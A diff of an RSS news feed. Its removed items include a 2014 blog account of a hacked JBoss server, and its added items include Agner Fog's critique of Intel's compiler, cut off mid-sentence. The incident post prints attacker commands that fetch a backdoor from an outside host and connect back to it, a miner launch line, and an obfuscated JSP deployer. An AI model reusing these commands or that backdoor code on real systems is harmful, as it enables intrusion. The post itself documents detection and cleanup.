-&lt;p&gt;&lt;a class=&quot;button button-big&quot; href=&quot;https://github.com/chinchang/build-git-learn-git/&quot;&gt;Github Repo&lt;/a&gt;&lt;/p&gt;
-
-&lt;h3 id=&quot;whats_next&quot;&gt;Whats next?&lt;/h3&gt;
-
-&lt;p&gt;Next I plan to implement concepts like merging (Fast-forward and 3-way-merge) and rebasing of branches.&lt;/p&gt;
-
-&lt;p&gt;I had a lot of fun writing this and hope you enjoyed it too. If you did, share the Git love with others.&lt;/p&gt;
-
-&lt;p&gt;Till next time, bbye.&lt;/p&gt;
-
-&lt;h4 id=&quot;references&quot;&gt;References&lt;/h4&gt;
-
-
-
-&lt;p&gt;Thanks &lt;a href=&quot;http://jsbin.com/&quot;&gt;JSBin&lt;/a&gt; for your lovely console panel :)&lt;/p&gt;
-
-&lt;p&gt;&lt;em&gt;Update: Join the &lt;a href=&quot;https://news.ycombinator.com/item?id=7089380&quot;&gt;discussion on HN&lt;/a&gt;.&lt;/em&gt;&lt;/p&gt;&lt;/div&gt;
-
-	
-&lt;/div&gt;
-</description>
-<title>
-Build Git – Learn Git
-</title>
-</item>
-<item>
-<author>
-corrspt
-</author>
-<link>
-http://www.corrspt.com/blog/2014/01/18/tale-vps-hacked/
-</link>
-<description>
-&lt;div&gt;&lt;div class=&quot;entry-content&quot;&gt;
-		&lt;p&gt;Hi everyone,&lt;/p&gt;
-&lt;p&gt;Just recently I published my &lt;a title=&quot;2013 Review and 2014 Technical Goals&quot; href=&quot;http://www.corrspt.com/blog/2014/01/14/2013-review-2014-technical-goals/&quot;&gt;technical goals for 2014&lt;/a&gt; &amp;#xA0;and one of them was to learn more about security. Well it couldn&amp;#x2019;t have been more appropriate, my &lt;a title=&quot;Virtual Private Server&quot; href=&quot;http://en.wikipedia.org/wiki/Virtual_private_server&quot;&gt;Virtual Private Server&lt;/a&gt; (VPS) just got hacked, for the second time (I use the VPS to host a Java web application). The first time, I basically rebuilt my server and hardened security as much as I could, but it didn&amp;#x2019;t work (more on what I did later). I&amp;#x2019;m not really a system administrator nor do I have much experience on the matter so I guess I must learn my lessons either studying or by being stung.&lt;/p&gt;
-&lt;h2&gt;What happened&lt;/h2&gt;
-&lt;p&gt;My VPS was being used to &lt;a title=&quot;BitCoin Mining&quot; href=&quot;http://www.bitcoinmining.com/&quot;&gt;mine bitcoins&lt;/a&gt;, I believe. If you never heard of &lt;a title=&quot;Bitcoin&quot; href=&quot;http://en.wikipedia.org/wiki/Bitcoin&quot;&gt;bitcoins, check Wikipedia&lt;/a&gt;&lt;/p&gt;
-&lt;h2&gt;How did I found out something was wrong?&lt;/h2&gt;
-&lt;p&gt;My VPS is configured to send me an email alert when CPU usage is above 90% for more than 2 (two) hours, which was what happened. I received an email by 20.30 last night (Jan, 17 &amp;#x2013; 2014)&lt;/p&gt;
-&lt;p&gt;I logged in my VPS and used the top command to find that a single process was using all CPU, this was the culprit:&lt;/p&gt;
-&lt;blockquote&gt;&lt;p&gt;14915 ? &amp;#xA0; &amp;#xA0; &amp;#xA0; &amp;#xA0;Ssl &amp;#xA0;710:07 ./logrotate -o stratum+tcp://bat.minersbest.com:10470 -u apapun.seattle -p x &amp;#x2013;threads=4 &amp;#x2013;background&lt;/p&gt;&lt;/blockquote&gt;
-&lt;p&gt;Never heard of something like that, but with a bit of googling I traced it to bitcoin mining.&lt;/p&gt;
-&lt;p&gt;As I said at the beginning this was the second time my server got hacked (using the same method I believe ), so this time I really had to figure what went wrong as I wasn&amp;#x2019;t going to do everything from scratch again!&lt;/p&gt;
-&lt;p&gt;The first time my server was hacked I rebuilt it from scratch with the following steps to increase security:&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;Install a newer CentOS version&lt;/li&gt;
-&lt;li&gt;Update all packages&lt;/li&gt;
-&lt;li&gt;Disable root login via SSH&lt;/li&gt;
-&lt;li&gt;Disable password login via SSH (only private keys)&lt;/li&gt;
-&lt;li&gt;Setup firewall to block all traffic except port 80 (HTTP), 443 (HTTPS) and 22 (SSH)&lt;/li&gt;
-&lt;li&gt;Install Fail2Ban&lt;/li&gt;
-&lt;li&gt;Change the user and root password to even more secure passwords (more than 15 chars each)&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;I thought I had it covered&amp;#x2026;&lt;/p&gt;
-&lt;p&gt;I tried checking the SSH log at &lt;strong&gt;/var/log/secure&lt;/strong&gt; and found that lots of attempts were made to login with different users (with common names like &lt;em&gt;admin&lt;/em&gt;, &lt;em&gt;oracle&lt;/em&gt;, &lt;em&gt;weblogic&lt;/em&gt;, &lt;em&gt;postgres&lt;/em&gt;, etc&amp;#x2026;) but none seemed to have succeeded as I had setup only private key login.&lt;/p&gt;
-&lt;p&gt;Could it be that someone found a vulnerability in my web application? Oh boy&amp;#x2026;&lt;br&gt;
-I have a setup where Jboss hosts the web application and Apache proxies and handles the SSL stuff.&lt;/p&gt;
-&lt;h2&gt;Checking Apache Logs&lt;/h2&gt;
-&lt;p&gt;I went on and checked the Apache access logs (in&amp;#xA0;&lt;strong&gt;/var/log/httpd/access_log&lt;/strong&gt;) around the time the CPU first went off and found something interesting&lt;/p&gt;
-&lt;blockquote&gt;&lt;p&gt;114.79.12.168 &amp;#x2013; - [17/Jan/2014:18:15:26 +0000] &amp;#x201C;GET /a/pwn.jsp?cmd=cat%20/proc/cpuinfo HTTP/1.1&amp;#x2033; 200 540 &amp;#x201C;-&amp;#x201D; &amp;#x201C;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.76 Safari/537.36&amp;#x2033;&lt;/p&gt;&lt;/blockquote&gt;
-&lt;p&gt;A &lt;strong&gt;GET&lt;/strong&gt; request to&amp;#xA0;&lt;strong&gt;/a/pwn.jsp&lt;/strong&gt; with a parameter &lt;strong&gt;cat /proc/cpuinfo&lt;/strong&gt;&amp;#x2026; like this JSP was some kind of a web shell.. and it got a 200 OK response? No way&amp;#x2026;&lt;br&gt;
-Back to the browser to check and surely enough, the server responded with an empty page&amp;#x2026; &amp;#xA0;Next check&amp;#x2026; I try &lt;strong&gt;/a/pwn.jsp?cmd=ls&lt;/strong&gt; and ouch&amp;#x2026; &lt;strong&gt;the directory listed&lt;/strong&gt;&amp;#x2026;&lt;/p&gt;
-&lt;p&gt;Ok, so let&amp;#x2019;s check the full log using the following command (trimmed for readability)&lt;/p&gt;
-&lt;blockquote&gt;&lt;p&gt;cat /var/log/httpd/acess_log | grep &amp;#x2018;pwn.jsp&amp;#x2019;&lt;/p&gt;&lt;/blockquote&gt;
-&lt;h6&gt;&lt;/h6&gt;
-&lt;h6&gt;[17/Jan/2014:18:15:26 +0000] &amp;#x201C;GET /a/pwn.jsp?cmd=cat%20/proc/cpuinfo&lt;br&gt;
-[17/Jan/2014:18:15:36 +0000] &amp;#x201C;GET /a/pwn.jsp?cmd=ps%20x&lt;br&gt;
-[17/Jan/2014:18:15:41 +0000] &amp;#x201C;GET /a/pwn.jsp?cmd=ls%20-al&lt;br&gt;
-[17/Jan/2014:18:15:52 +0000] &amp;#x201C;GET /a/pwn.jsp?cmd=wget%20pdd-nos.info/.tmp/back.conn.txt%20-O%20bd&lt;br&gt;
-[17/Jan/2014:18:16:05 +0000] &amp;#x201C;GET /a/pwn.jsp?cmd=perl%20bd%20pdd-nos.info%2011457&lt;br&gt;
-[17/Jan/2014:18:17:44 +0000] &amp;#x201C;GET /a/pwn.jsp?cmd=ps%20x&lt;br&gt;
-[17/Jan/2014:18:18:23 +0000] &amp;#x201C;GET /a/pwn.jsp?cmd=ps%20x&lt;br&gt;
-[17/Jan/2014:18:27:57 +0000] &amp;#x201C;GET /a/pwn.jsp?cmd=ps%20x&lt;/h6&gt;
-&lt;p&gt;With a little cleaning and url decode, you get the following list of commands:&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;cat /proc/cpuinfo&lt;/li&gt;
-&lt;li&gt;ps x&lt;/li&gt;
-&lt;li&gt;ls -al&lt;/li&gt;
-&lt;li&gt;wget pdd-nos.info/.tmp/back.conn.txt -O bd&lt;/li&gt;
-&lt;li&gt;perl bd pdd-nos.info 11457&lt;/li&gt;
-&lt;li&gt;ps x&lt;/li&gt;
-&lt;li&gt;kill 14873&lt;/li&gt;
-&lt;li&gt;ps x&lt;/li&gt;
-&lt;li&gt;ps x&lt;/li&gt;
-&lt;/ol&gt;
-&lt;p&gt;Interesting to see is that the web shell appears to be just a means to and end, because the wget used in step 4) downloaded something that was used in step 5) by the perl interpreter, I checked the pdd-nos.info link and found what appears to be a some kind of a backdoor shell and I assume this was what was used to launch the bitcoin mining process.&lt;/p&gt;
-
-&lt;h2&gt;Breach detected&lt;/h2&gt;
-&lt;p&gt;Ok, so I have a problem, a big one. And I need to do two things:&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;Eliminate the threat so that my VPS is once again my VPS &lt;img src=&quot;http://www.corrspt.com/blog/wp-includes/images/smilies/icon_smile.gif&quot; alt=&quot;:)&quot; class=&quot;wp-smiley&quot;&gt; &lt;/li&gt;
-&lt;li&gt;Find out how they installed a web shell&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;I started by searching how someone installed a web shell in my Jboss instance. With a bit of googling I found the following resources (the &amp;#x201C;pwn.jsp&amp;#x201D; filename was a really big help there)&lt;/p&gt;
-
-&lt;p&gt;Which in turn led me to find an existing vulnerability regarding &lt;a title=&quot;Jboss Vulnerability&quot; href=&quot;http://www.symantec.com/security_response/attacksignatures/detail.jsp?asid=27126&quot;&gt;JBoss&amp;#x2019;s HTTP Invoker was probably used&lt;/a&gt;, that basically means an attacker could trigger a remote code execution. Not nice!&lt;/p&gt;
-&lt;p&gt;With additional search &lt;a title=&quot;Jboss Http Invoker Exploit&quot; href=&quot;http://www.exploit-db.com/exploits/28713/&quot;&gt;I found an exploit ready to be used&lt;/a&gt;. A PHP script that downloads a .war application which contains the web shell and uses the known vulnerability in the HTTP invoker to deploy the .war.&lt;/p&gt;
-&lt;p&gt;But wait a minute, where was that &lt;strong&gt;logrotate&lt;/strong&gt;&amp;#xA0;process that was consuming my CPU (cleverly named so that I wouldn&amp;#x2019;t notice)? If there&amp;#x2019;s a process then there&amp;#x2019;s an executable somewhere. I found it right inside my &lt;strong&gt;/JBOSS_HOME/bin&lt;/strong&gt; folder along with a file named &lt;strong&gt;jboss4.txt&lt;/strong&gt; (also named so that I wouldn&amp;#x2019;t found him suspicious) whose content was&lt;/p&gt;
-&lt;blockquote&gt;&lt;p&gt;print &amp;#x201C;Executed&amp;#x201D;;&lt;br&gt;
-system(&amp;#x201C;nohup ./logrotate -o stratum+tcp://bat.minersbest.com:10470 -u apapun.seattle -p x &amp;#x2013;threads=4 &amp;amp;&amp;gt; logrotate.log&amp;#x201D;);&lt;/p&gt;&lt;/blockquote&gt;
-&lt;p&gt;Now, the issue is&amp;#x2026; &lt;strong&gt;was there something else&lt;/strong&gt; that could have been changed so that even if I restarted JBoss it would allow the attacker to execute the same attack again? &lt;strong&gt;Hunt time&lt;/strong&gt;!&lt;/p&gt;
-&lt;p&gt;Indeed I found that in &lt;strong&gt;/JBOSS_HOME/server/INSTANCE/server/deploy/management&lt;/strong&gt; was a little folder called &amp;#x201C;lMvcdFxMFrvdib.war&amp;#x201D; (I kid you not) and inside the folder a file named &amp;#x201C;ZqxQljMExRpriU.jsp&amp;#x201D; (again I kid you not).. the content of the JSP was&lt;/p&gt;
-&lt;blockquote&gt;&lt;p&gt;&amp;lt;%@page import=&amp;#x201D;java.io.*,&lt;br&gt;
-java.util.*,&lt;br&gt;
-sun.misc.BASE64Decoder&amp;#x201D;&lt;br&gt;
-%&amp;gt;&lt;br&gt;
-&amp;lt;%&lt;br&gt;
-String PJdpj = &amp;#x201C;&amp;#x201D;;&lt;br&gt;
-String pIGx = &amp;#x201C;&amp;#x201D;;&lt;br&gt;
-String RSVw = System.getProperty(&amp;#x201C;jboss.server.home.dir&amp;#x201D;);&lt;br&gt;
-if (request.getParameter(&amp;#x201C;pUBYyDsT&amp;#x201D;) != null){&lt;br&gt;
-try {&lt;br&gt;
-PJdpj = request.getParameter(&amp;#x201C;pUBYyDsT&amp;#x201D;);&lt;br&gt;
-pIGx = request.getParameter(&amp;#x201C;oAEICWIo&amp;#x201D;);&lt;br&gt;
-byte[] rFPE = new BASE64Decoder().decodeBuffer(PJdpj);&lt;br&gt;
-String MfNJU = RSVw + &amp;#x201C;/deploy/&amp;#x201D; + pIGx + &amp;#x201C;.war&amp;#x201D;;&lt;br&gt;
-FileOutputStream twkH = new FileOutputStream(MfNJU);&lt;br&gt;
-twkH.write(rFPE);&lt;br&gt;
-twkH.close();&lt;br&gt;
-}&lt;br&gt;
-catch(Exception e) {}&lt;br&gt;
-}&lt;br&gt;
-else {&lt;br&gt;
-try{&lt;br&gt;
-String VBpM = request.getParameter(&amp;#x201C;oAEICWIo&amp;#x201D;);&lt;br&gt;
-String dhkDS = RSVw + &amp;#x201C;/deploy/&amp;#x201D; + VBpM + &amp;#x201C;.war&amp;#x201D;;&lt;br&gt;
-new File(dhkDS).delete();&lt;br&gt;
-}&lt;br&gt;
-catch(Exception e) {}&lt;br&gt;
-}&lt;/p&gt;&lt;/blockquote&gt;
-&lt;p&gt;Although the variable names are obfuscated you can tell that it receives some content encoded as Base64 and then writes that content to a .war file inside JBoss&amp;#x2019;s deploy directory. &lt;strong&gt;Clever trick&lt;/strong&gt;&amp;#x2026; if I was to remove the attacker&amp;#x2019;s original war (the one with pwn.jsp) and restart Jboss, this .war file would also be deployed and provide a clear path of attack again!&lt;/p&gt;
-&lt;h2&gt;Securing JBoss&lt;/h2&gt;
-&lt;p&gt;So I had to secure the HTTP Invoker and that was the problem. I had the HTTPInvoker and WebConsole deployed and accessible to anyone (big, big mistake), since I don&amp;#x2019;t need them, I simply removed them, simple enough. Next, to delete the files!&lt;/p&gt;
-&lt;h2&gt;Eliminate the threat&lt;/h2&gt;
-&lt;p&gt;I had to delete the files in &lt;strong&gt;JBOSS_HOME/bin&lt;/strong&gt; which where used to create shell and mine the bitcoins, I had to delete the pwn.jsp that was installed in my JBoss instance and had to delete the war with the crazy name to stop an attacker from deploying another war without my knowledge.&lt;/p&gt;
-&lt;h2&gt;&lt;strong&gt;Conclusion&lt;/strong&gt;&lt;/h2&gt;
-&lt;p&gt;The conclusion is that you can never be to careful with security. Anyone from around the world can try to &lt;a title=&quot;Frak&quot; href=&quot;http://en.wikipedia.org/wiki/Frak_(expletive)&quot;&gt;&lt;em&gt;frak&lt;/em&gt;&lt;/a&gt; you and you must be very careful. I overlooked the deployment of the web console and HTTP Invoker and I paid for that. Things could have been worse If the attacker found a way to upgrade the privileges of the user running jboss (it&amp;#x2019;s a sudoer, but the password is really hard) he could have done a lot more damage. I hope I&amp;#x2019;ve removed the threat but I can&amp;#x2019;t be 100% sure, so I&amp;#x2019;ll have to &amp;#xA0;keep monitoring, but I&amp;#x2019;ve learned my lesson.&lt;/p&gt;
-&lt;p&gt;I found a &lt;a title=&quot;Exploit&quot; href=&quot;http://blog.imperva.com/2013/11/threat-advisory-a-jboss-as-exploit-web-shell-code-injection.html&quot;&gt;detailed guide explaining the exploit and how it works&lt;/a&gt;, in case you want additional information.&lt;/p&gt;
-&lt;p&gt;Happy coding and be safe!&lt;/p&gt;
-&lt;p&gt;Additional resources&lt;/p&gt;
-
-
-
-
-				&lt;div class=&quot;mr_social_sharing_wrapper&quot;&gt;
-				&lt;span class=&quot;mr_social_sharing&quot;&gt;&lt;/span&gt;&lt;span class=&quot;mr_social_sharing&quot;&gt;&lt;a href=&quot;https://twitter.com/share&quot; class=&quot;twitter-share-button&quot;&gt;&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;mr_social_sharing&quot;&gt;&lt;a href=&quot;http://www.reddit.com/submit?url=http%3A%2F%2Fwww.corrspt.com%2Fblog%2F2014%2F01%2F18%2Ftale-vps-hacked%2F&quot; class=&quot;mr_social_sharing_popup_link&quot;&gt;&lt;img src=&quot;http://www.corrspt.com/blog/wp-content/plugins/social-sharing-toolkit/images/buttons/reddit.png&quot; class=&quot;nopin&quot; alt=&quot;Submit to reddit&quot; title=&quot;Submit to reddit&quot;&gt;&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;mr_social_sharing&quot;&gt;&lt;a class=&quot;linksalpha_button linksalpha_link&quot; href=&quot;http://www.linksalpha.com/social/mobile&quot;&gt;
-					&lt;img src=&quot;http://www.linksalpha.com/images/social_share_button.png&quot; alt=&quot;Share&quot; class=&quot;linksalpha_image&quot;&gt;
-					&lt;/a&gt;&lt;/span&gt;&lt;/div&gt;			&lt;/div&gt;
-
-	
-&lt;/div&gt;
-</description>
-<title>
-Kids, this is story of How I Met… my VPS hacked.
-</title>
-</item>
-<item>
 <link>
 http://blog.mikiobraun.de/2014/01/apache-spark.html
 </link>
@@ -761,6 +75,376 @@ http://blog.mikiobraun.de/2014/01/apache-spark.html
 </description>
 <title>
 Apache Spark: The Next Big Data Thing?
+</title>
+</item>
+<item>
+<link>
+http://baboom.com/
+</link>
+<description>
+&lt;div class=&quot;phone&quot;&gt;
+        &lt;div id=&quot;page&quot;&gt;
+            
+
+            &lt;div class=&quot;page-wrapper&quot;&gt;
+                &lt;div class=&quot;page-container&quot;&gt;
+                    
+                    &lt;div class=&quot;content&quot;&gt;
+                        
+
+                        &lt;div class=&quot;section&quot;&gt;
+                            &lt;div class=&quot;align-middle-wrapper&quot;&gt;
+                                &lt;div class=&quot;align-middle&quot;&gt;
+                                    
+
+                                    &lt;p class=&quot;cant-wait-title title&quot;&gt;Can't wait to see &lt;br&gt;&lt;span class=&quot;strong&quot;&gt;what we're all about?&lt;/span&gt;&lt;/p&gt;
+                                    &lt;p class=&quot;check-album-subtitle subtitle&quot;&gt;Check the first album ever released on Baboom,&lt;br&gt; &lt;span class=&quot;strong&quot;&gt;Good Times&lt;/span&gt; by Kim Dotcom&lt;/p&gt;
+
+                                    &lt;p class=&quot;check-album-subtitle-compact subtitle&quot;&gt;Check the first album ever released on Baboom&lt;/p&gt;
+                                    
+
+                                    
+
+                                    
+                                &lt;/div&gt;
+                            &lt;/div&gt;
+                        &lt;/div&gt;
+
+                        
+
+                    &lt;/div&gt;
+                &lt;/div&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+
+        
+        &lt;a href=&quot;https://plus.google.com/104355472463686127790&quot; rel=&quot;publisher&quot; class=&quot;google-plus-link&quot;&gt;Google+&lt;/a&gt;
+
+        
+        
+    &lt;/div&gt;
+
+</description>
+<title>
+Kim Dotcom's new music streaming service
+</title>
+</item>
+<item>
+<link>
+http://www.agner.org/optimize/blog/read.php?i=49
+</link>
+<description>
+&lt;div&gt;&lt;td class=&quot;message&quot; width=&quot;100%&quot; colspan=&quot;2&quot;&gt;&lt;h2&gt;Will Intel be forced to remove the &quot;cripple AMD&quot; function from
+their compiler?&lt;/h2&gt;
+&lt;p&gt;Many software programmers consider Intel's compiler the best optimizing
+compiler on the market, and it is often the preferred compiler for the most
+critical applications. Likewise, Intel is supplying a lot of highly optimized
+function libraries for many different technical and scientific applications. In
+many cases, there are no good alternatives to Intel's function libraries.&lt;/p&gt;
+&lt;p&gt;Unfortunately, software compiled with the Intel compiler or the Intel
+function libraries has inferior performance on AMD and VIA processors. The
+reason is that the compiler or library can make multiple versions of a piece of
+code, each optimized for a certain processor and instruction set, for example
+SSE2, SSE3, etc. The system includes a function that detects which type of CPU
+it is running on and chooses the optimal code path for that CPU. This is called
+a CPU dispatcher. However, the Intel CPU dispatcher does not only check which
+instruction set is supported by the CPU, it also checks the vendor ID string. If
+the vendor string says &quot;GenuineIntel&quot; then it uses the optimal code
+path. If the CPU is not from Intel then, in most cases, it will run the slowest
+possible version of the code, even if the CPU is fully compatible with a better
+version.&lt;/p&gt;
+&lt;p&gt;I have complained about this behavior for years, and so have many others, but
+Intel have refused to change their CPU dispatcher. If Intel had advertised their
+compiler as compatible with Intel processors only, then there would probably be
+no complaints. The problem is that they are trying to hide what they are doing.
+Many software developers think that the compiler is compatible with AMD
+processors, and in fact it is, but unbeknownst to the programmer it puts in a
+biased CPU dispatcher that chooses an inferior code path whenever it is running
+on a non-Intel processor. If programmers knew this fact they would probably use
+another compiler. Who wants to sell a piece of software that doesn't work well
+on AMD processors? &lt;/p&gt;
+&lt;p&gt;Because of their size, Intel can afford to put more money into their compiler
+than other CPU vendors can. The Intel compiler is relatively cheap, it has superior
+performance, and the support is excellent. Selling such a compiler is certainly
+not a profitable business in itself, but it is obviously intended as a way of
+supporting Intel's microprocessors. There would be no point in adding new
+advanced instructions to the microprocessors if there were no tools to use these
+instructions. AMD is also making a compiler, but the current version supports
+only Linux, not Windows. &lt;/p&gt;
+&lt;p&gt;Various people have raised suspicion that the biased CPU dispatching has made its way into
+common benchmark programs (&lt;a href=&quot;http://www.brightsideofnews.com/print/2009/12/17/why-the-ftc-lawsuit-against-intel-has-substance.aspx&quot;&gt;link&lt;/a&gt;
+&lt;a href=&quot;http://arstechnica.com/hardware/reviews/2008/07/atom-nano-review.ars/6&quot;&gt;link&lt;/a&gt;).
+This is a serious issue indeed. We know that many customers base their buying
+decision on published benchmark results, and a biased benchmark means an unfair
+market advantage worth billions of dollars. &lt;/p&gt;
+
+&lt;h2&gt;The legal battle &lt;/h2&gt;
+&lt;p&gt;AMD have sued Intel for unfair competition at least since 2005, and the case
+has been &lt;a href=&quot;http://download.intel.com/pressroom/legal/AMD_settlement_agreement.pdf&quot;&gt;settled&lt;/a&gt;
+in November 2009. This settlement deals with many issues of unfair competition,
+apparently including the Intel compiler. The settlement says: &lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;2.3 TECHNICAL PRACTICES&lt;br&gt;
+&lt;br&gt;
+Intel shall not include any Artificial Performance Impairment in any Intel
+product or require any Third Party to include an Artificial Performance
+Impairment in the Third Party&amp;#x92;s product. As used in this Section 2.3, &amp;#x93;&lt;u&gt;Artificial
+Performance Impairment&lt;/u&gt;&amp;#x94; means an affirmative engineering or design action
+by Intel (but not a failure to act) that (i) degrades the performance or
+operation of a Specified AMD product, (ii) is not a consequence of an Intel
+Product Benefit and (iii) is made intentionally to degrade the performance or
+operation of a Specified AMD Product. For purposes of this Section 2.3, &amp;#x93;&lt;u&gt;Product
+Benefit&lt;/u&gt;&amp;#x94; shall mean any benefit, advantage, or improvement in terms of
+performance, operation, price, cost, manufacturability, reliability,
+compatibility, or ability to operate or enhance the operation of another
+product.&lt;br&gt;
+&lt;br&gt;
+In no circumstances shall this Section 2.3 impose or be construed to impose any
+obligation on Intel to (i) take any act that would provide a Product Benefit to
+any AMD or other non-Intel product, either when such AMD or non-Intel product is
+used alone or in combination with any other product, (ii) optimize any products
+for Specified AMD Products, or (iii) provide any technical information,
+documents, or know how to AMD. &lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;This looks like a victory for AMD. If we read &quot;any Intel product&quot;
+as Intel's compilers and function libraries, &quot;any Third Party&quot; as
+programmers using these compilers and libraries, and &quot;Artificial
+Performance Impairment&quot; as the CPU dispatcher checking the vendor ID
+string; then the settlement puts an obligation on Intel to change their CPU
+dispatcher. I will certainly check the next version of Intel's compiler and
+libraries to see if they have done so or they have found a loophole in the
+settlement. &lt;/p&gt;
+&lt;p&gt;Interestingly, this is not the end of the story. Only about one month after
+the AMD/Intel settlement, the US Federal Trade Commission (FTC) filed an &lt;a href=&quot;http://www.ftc.gov/os/adjpro/d9341/091216intelcmpt.pdf&quot;&gt;antitrust
+complaint&lt;/a&gt; against Intel. The accusations in the FTC complaint are unusually
+strong: &lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;Intel sought to undercut the performance advantage of
+  non-Intel x86 CPUs relative to Intel x86 CPUs when it redesigned and
+  distributed software products, such as compilers and libraries.&lt;br&gt;
+  [...]&lt;br&gt;
+  To the public, OEMs, ISVs, and benchmarking organizations, the slower
+  performance of non-Intel CPUs on Intel-compiled software applications appeared
+  to be caused by the non-Intel CPUs rather than the Intel software. Intel
+  failed to disclose the effects of the changes it made to its software in or
+  about 2003 and later to its customers or the public. Intel also disseminated
+  false or misleading documentation about its compiler and libraries. Intel
+  represented to ISVs, OEMs, benchmarking organizations, and the public that
+  programs inherently performed better on Intel CPUs than on competing CPUs. In
+  truth and in fact, many differences were due largely or entirely to the Intel
+  software. Intel&amp;#x92;s misleading or false statements and omissions about the
+  performance of its software were material to ISVs, OEMs, benchmarking
+  organizations, and the public in their purchase or use of CPUs. Therefore,
+  Intel&amp;#x92;s representations that programs inherently performed better on Intel
+  CPUs than on competing CPUs were, and are, false or misleading. Intel&amp;#x92;s
+  failure to disclose that the differences were due largely to the Intel
+  software, in light of the representations made, was, and is, a deceptive
+  practice. Moreover, those misrepresentations and omissions were likely to harm
+  the reputation of other x86 CPUs companies, and harmed competition.&lt;br&gt;
+  [...]&lt;br&gt;
+  Some ISVs requested information from Intel concerning the apparent variation
+  in performance of identical software run on Intel and non-Intel CPUs. In
+  response to such requests, on numerous occasions, Intel misrepresented,
+  expressly or by implication, the source of the problem and whether it could be
+  solved.&lt;br&gt;
+  [...]&lt;br&gt;
+  Intel&amp;#x92;s software design changes slowed the performance of non-Intel x86 CPUs
+  and had no sufficiently justifiable technological benefit. Intel&amp;#x92;s deceptive
+  conduct deprived consumers of an informed choice between Intel chips and rival
+  chips, and between Intel software and rival software, and raised rivals&amp;#x92;
+  costs of competing in the relevant CPU markets. The loss of performance caused
+  by the Intel compiler and libraries also directly harmed consumers that used
+  non-Intel x86 CPUs.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;The remedy that the FTC asks for is also quite farreaching: &lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;Requiring that, with respect to those Intel customers that purchased from
+  Intel a software compiler that had or has the design or effect of impairing
+  the actual or apparent performance of microprocessors not manufactured by
+  Intel (&quot;Defective Compiler&quot;), as described in the Complaint:&lt;/p&gt;
+  &lt;ol type=&quot;a&quot;&gt;
+    &lt;li&gt;Intel provide them, at no additional charge, a substitute compiler that is
+  not a Defective Compiler;&lt;/li&gt;
+    &lt;li&gt;Intel compensate them for the cost of recompiling the software they had
+  compiled on the Defective Compiler and of substituting, and distributing to
+  their own customers, the recompiled software for software compiled on a Defective
+  Compiler; and&lt;/li&gt;
+    &lt;li&gt;Intel give public notice and warning, in a manner likely to be communicated
+  to persons that have purchased software compiled on Defective Compilers
+  purchased from Intel, of the possible need to replace that software.&lt;/li&gt;
+  &lt;/ol&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Maybe the FTC has decided&amp;#xA0;that the AMD/Intel settlement was not a fair
+and sufficient remedy against Intel's monopoly behavior? The settlement
+compensates AMD, but not VIA and other microprocessor vendors, and not the customers who have been harmed by
+insufficient competition and by the &quot;defective&quot; software produced with
+the Intel compiler. &lt;/p&gt;
+
+&lt;h2&gt;My own findings &lt;/h2&gt;
+&lt;p&gt;When I started testing Intel's compiler several years ago, I soon found out
+that it had a biased CPU dispatcher. Back in January 2007 I complained to Intel
+about the unfair CPU dispatcher. I had a long correspondence with Intel
+engineers about the issue, where they kept denying the problem and I kept
+providing more evidence. They said that: &lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;The CPU dispatch, coupled with optimizations, is designed to optimize
+  performance across Intel and AMD processors to give the best results. This is
+  clearly our goal and with one exception we believe we are there now. The one
+  exception is that our 9.x compilers do not support SSE3 on AMD processors
+  because of the timing of the release of AMD processors vs. our compiler (our
+  compiler was developed before AMD supported SSE3). The future 10.x compilers,
+  which enter beta this quarter and release around the middle of the year, will
+  address this now that we&amp;#x92;ve had time to tune and adjust to the new AMD
+  processors.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Sounds nice, but the truth is that the CPU dispatcher didn't support SSE or
+SSE2 or any higher SSE in AMD processors and still doesn't today (Intel compiler
+version 11.1.054). I have
+later found out that others have made similar complaints to Intel and got
+similarly useless answers (&lt;a href=&quot;http://yro.slashdot.org/comments.pl?sid=155593&amp;amp;cid=13042922&quot;&gt;link&lt;/a&gt;
+&lt;a href=&quot;http://www.swallowtail.org/naughty-intel.shtml&quot;&gt;link&lt;/a&gt;). &lt;/p&gt;
+&lt;p&gt;The Intel CPU dispatcher does not only check the vendor ID string and the
+instruction sets supported. It also checks for specific processor models. In
+fact, it will fail to recognize future Intel processors with a family number
+different from 6. When I mentioned this to the Intel engineers they replied: &lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;You mentioned we will not support future Intel processors with non-'6'
+  family designations without a compiler update. Yes, that is correct and
+  intentional. Our compiler produces code which we have high confidence will
+  continue to run in the future. This has the effect of not assuming anything
+  about future Intel or AMD or other processors. You have noted we could be more
+  aggressive. We believe that would not be wise for our customers, who want a
+  level of security that their code (built with our compiler) will continue to
+  run far into the future. Your suggested methods, while they may sound
+  reasonable, are not conservative enough for our highly optimizing compiler.
+  Our experience steers us to issue code conservatively, and update the compiler
+  when we have had a chance to verify functionality with new Intel and new AMD
+  processors. That means there is a lag sometime in our production release
+  support for new processors. &lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;In other words, they claim that they are optimizing for specific processor
+models rather than for specific instruction sets. If true, this gives Intel an
+argument for not supporting AMD processors properly. But it also means that all
+software developers who use an Intel compiler have to recompile their code and
+distribute new versions to their customers every time a new Intel processor
+appears on the market. Now, this was three years ago. What happens if I try to
+run a program compiled with an old version of Intel's compiler on the newest
+Intel processors? You guessed it: It still runs the optimal code path. But the
+reason is more difficult to guess: Intel have manipulated the CPUID family numbers on new processors in such a way that they appear as known models to older Intel
